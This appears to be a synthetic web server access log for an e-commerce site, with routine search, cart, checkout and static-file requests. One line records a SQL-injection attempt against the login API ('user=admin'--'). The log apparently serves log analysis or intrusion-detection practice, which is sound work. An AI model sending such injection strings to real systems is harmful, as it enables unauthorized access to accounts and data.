192.168.1.24 - - [15/Jun/2025:00:34:34 +0000] "POST /search?q=laptop HTTP/1.1" 200 2444 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:08:15 +0000] "POST /api/login HTTP/1.1" 401 203 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [15/Jun/2025:00:56:36 +0000] "GET /static/css/main.css HTTP/1.1" 200 2206 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:47:00 +0000] "GET /checkout HTTP/1.1" 200 1437 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.15 - - [15/Jun/2025:00:39:46 +0000] "GET /about HTTP/1.1" 200 7470 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.39 - - [15/Jun/2025:00:51:27 +0000] "GET /api/user/profile HTTP/1.1" 304 7119 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.40 - - [15/Jun/2025:00:54:27 +0000] "GET /static/css/main.css HTTP/1.1" 404 2086 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.24 - - [15/Jun/2025:00:33:35 +0000] "POST /cart HTTP/1.1" 200 1233 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.46 - - [15/Jun/2025:00:40:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 1250 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:23:09 +0000] "GET /api/login?user=admin'-- HTTP/1.1" 400 435 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
